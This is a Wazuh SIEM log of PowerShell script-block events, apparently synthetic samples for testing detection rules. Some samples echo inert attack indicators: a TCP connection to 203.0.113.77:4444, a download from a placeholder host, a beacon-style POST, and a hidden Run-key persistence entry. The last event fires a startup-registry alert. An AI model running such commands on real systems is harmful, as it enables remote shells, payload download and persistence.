{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3270e5a1-4946-4764-8972-8d2e78ccbbd9","scriptBlockText":"$sampleId='PST-272'; $indicator='Invoke-RestMethod -Method Post -Uri ''https://api.example.invalid/checkin'' -Body @{host=''WS-01'';user=''analyst'';status=''ok''}'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723739","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-272'; $indicator='Invoke-RestMethod -Method Post -Uri ''https://api.example.invalid/checkin'' -Body @{host=''WS-01'';user=''analyst'';status=''ok''}'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3270e5a1-4946-4764-8972-8d2e78ccbbd9\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:39.4667160Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:39.4667160Z\",\"eventRecordID\":\"723739\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-272'; $indicator='Invoke-RestMethod -Method Post -Uri ''https://api.example.invalid/checkin'' -Body @{host=''WS-01'';user=''analyst'';status=''ok''}'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3270e5a1-4946-4764-8972-8d2e78ccbbd9\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-272'; $indicator='Invoke-RestMethod -Method Post -Uri ''https://api.example.invalid/checkin'' -Body @{host=''WS-01'';user=''analyst'';status=''ok''}'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3270e5a1-4946-4764-8972-8d2e78ccbbd9\"}}}","id":"1784281059.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:39.995+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"24df1850-3fdb-40a1-b260-f4c0b3c1be4a","scriptBlockText":"$sampleId='PST-273'; $indicator='$CLiEnt=neW-ObjECt system.nET.sockEts.tCPclIenT(''203.0.113.77'',4444); $STreaM=$cLIenT.GETsTrEaM(); $BUfFEr=NEW-obJECT bytE[] 4096; $reAD=$StREAm.ReaD($bUffeR,0,$bUFfER.LENGTH)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723754","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-273'; $indicator='$CLiEnt=neW-ObjECt system.nET.sockEts.tCPclIenT(''203.0.113.77'',4444); $STreaM=$cLIenT.GETsTrEaM(); $BUfFEr=NEW-obJECT bytE[] 4096; $reAD=$StREAm.ReaD($bUffeR,0,$bUFfER.LENGTH)'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 24df1850-3fdb-40a1-b260-f4c0b3c1be4a\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:40.0527393Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:40.0527393Z\",\"eventRecordID\":\"723754\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-273'; $indicator='$CLiEnt=neW-ObjECt system.nET.sockEts.tCPclIenT(''203.0.113.77'',4444); $STreaM=$cLIenT.GETsTrEaM(); $BUfFEr=NEW-obJECT bytE[] 4096; $reAD=$StREAm.ReaD($bUffeR,0,$bUFfER.LENGTH)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 24df1850-3fdb-40a1-b260-f4c0b3c1be4a\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-273'; $indicator='$CLiEnt=neW-ObjECt system.nET.sockEts.tCPclIenT(''203.0.113.77'',4444); $STreaM=$cLIenT.GETsTrEaM(); $BUfFEr=NEW-obJECT bytE[] 4096; $reAD=$StREAm.ReaD($bUffeR,0,$bUFfER.LENGTH)'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"24df1850-3fdb-40a1-b260-f4c0b3c1be4a\"}}}","id":"1784281061.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:41.046+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"031487d1-fb24-4574-9ab9-72d118cffc89","scriptBlockText":"$sampleId='PST-274'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723755","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-274'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 031487d1-fb24-4574-9ab9-72d118cffc89\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:40.3881583Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:40.3881583Z\",\"eventRecordID\":\"723755\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-274'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 031487d1-fb24-4574-9ab9-72d118cffc89\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-274'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"031487d1-fb24-4574-9ab9-72d118cffc89\"}}}","id":"1784281061.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:41.048+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"64563472-02af-42e5-ab74-2eac5a702739","scriptBlockText":"$sampleId='PST-275'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723761","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-275'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 64563472-02af-42e5-ab74-2eac5a702739\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:40.8845994Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:40.8845994Z\",\"eventRecordID\":\"723761\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-275'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 64563472-02af-42e5-ab74-2eac5a702739\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-275'; Get-NetRoute -ErrorAction SilentlyContinue | Select-Object -First 5 DestinationPrefix, NextHop; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"64563472-02af-42e5-ab74-2eac5a702739\"}}}","id":"1784281061.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:41.101+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"26268c8b-5173-4595-83b3-fd1b67b0040d","scriptBlockText":"$sampleId='PST-276'; Get-ExecutionPolicy -List; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723764","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-276'; Get-ExecutionPolicy -List; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 26268c8b-5173-4595-83b3-fd1b67b0040d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:41.2283915Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:41.2283915Z\",\"eventRecordID\":\"723764\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-276'; Get-ExecutionPolicy -List; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 26268c8b-5173-4595-83b3-fd1b67b0040d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-276'; Get-ExecutionPolicy -List; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"26268c8b-5173-4595-83b3-fd1b67b0040d\"}}}","id":"1784281062.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:42.082+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f0d2c138-08de-4f0c-8628-7f970472744b","scriptBlockText":"$sampleId='PST-277'; $indicator='$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::DefaultWebProxy; $wc.Headers[''User-Agent'']=''Mozilla/5.0''; $wc.DownloadString(''https://cdn.example.invalid/a'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723767","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-277'; $indicator='$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::DefaultWebProxy; $wc.Headers[''User-Agent'']=''Mozilla/5.0''; $wc.DownloadString(''https://cdn.example.invalid/a'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f0d2c138-08de-4f0c-8628-7f970472744b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:41.5653707Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:41.5653707Z\",\"eventRecordID\":\"723767\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-277'; $indicator='$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::DefaultWebProxy; $wc.Headers[''User-Agent'']=''Mozilla/5.0''; $wc.DownloadString(''https://cdn.example.invalid/a'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f0d2c138-08de-4f0c-8628-7f970472744b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-277'; $indicator='$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::DefaultWebProxy; $wc.Headers[''User-Agent'']=''Mozilla/5.0''; $wc.DownloadString(''https://cdn.example.invalid/a'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f0d2c138-08de-4f0c-8628-7f970472744b\"}}}","id":"1784281062.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:42.087+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8db5ec58-baa2-437a-a12b-b2f8684ed453","scriptBlockText":"$sampleId='PST-278'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723771","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-278'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8db5ec58-baa2-437a-a12b-b2f8684ed453\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:41.9062337Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:41.9062337Z\",\"eventRecordID\":\"723771\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-278'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8db5ec58-baa2-437a-a12b-b2f8684ed453\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-278'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8db5ec58-baa2-437a-a12b-b2f8684ed453\"}}}","id":"1784281062.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:42.138+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1d89f176-ad28-4f30-afd4-547a0abbe706","scriptBlockText":"$sampleId='PST-279'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723787","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-279'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1d89f176-ad28-4f30-afd4-547a0abbe706\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:42.5122289Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:42.5122289Z\",\"eventRecordID\":\"723787\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-279'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1d89f176-ad28-4f30-afd4-547a0abbe706\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-279'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1d89f176-ad28-4f30-afd4-547a0abbe706\"}}}","id":"1784281063.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:43.125+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"123c056e-8680-4234-a566-557d6ebb65ab","scriptBlockText":"$sampleId='PST-280'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723792","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-280'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 123c056e-8680-4234-a566-557d6ebb65ab\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:43.0231274Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:43.0231274Z\",\"eventRecordID\":\"723792\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-280'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 123c056e-8680-4234-a566-557d6ebb65ab\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-280'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"123c056e-8680-4234-a566-557d6ebb65ab\"}}}","id":"1784281063.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:43.190+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8d511cfb-162e-486e-8370-df15ccade71a","scriptBlockText":"$sampleId='PST-281'; $indicator='New-ItemProperty -Path ''HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'' -Name ''UpdateCheck'' -Value ''powershell.exe -WindowStyle Hidden -File C:\\\\__THESIS_INERT__\\\\stage.ps1'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723808","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-281'; $indicator='New-ItemProperty -Path ''HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'' -Name ''UpdateCheck'' -Value ''powershell.exe -WindowStyle Hidden -File C:\\__THESIS_INERT__\\stage.ps1'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8d511cfb-162e-486e-8370-df15ccade71a\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:43.3678898Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:43.3678898Z\",\"eventRecordID\":\"723808\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-281'; $indicator='New-ItemProperty -Path ''HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'' -Name ''UpdateCheck'' -Value ''powershell.exe -WindowStyle Hidden -File C:\\\\__THESIS_INERT__\\\\stage.ps1'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8d511cfb-162e-486e-8370-df15ccade71a\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-281'; $indicator='New-ItemProperty -Path ''HKCU:\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run'' -Name ''UpdateCheck'' -Value ''powershell.exe -WindowStyle Hidden -File C:\\\\\\\\__THESIS_INERT__\\\\\\\\stage.ps1'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8d511cfb-162e-486e-8370-df15ccade71a\"}}}","id":"1784281064.592585","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Possible addition of new item to Windows startup registry","firedtimes":2,"groups":["windows"," powershell"],"id":"91844","level":12,"mail":true,"mitre":{"id":["T1547.001","T1059.001","T1112"],"tactic":["Persistence","Privilege Escalation","Execution","Defense Evasion"],"technique":["Registry Run Keys / Startup Folder","PowerShell","Modify Registry"]}},"timestamp":"2026-07-17T11:37:44.268+0200"}
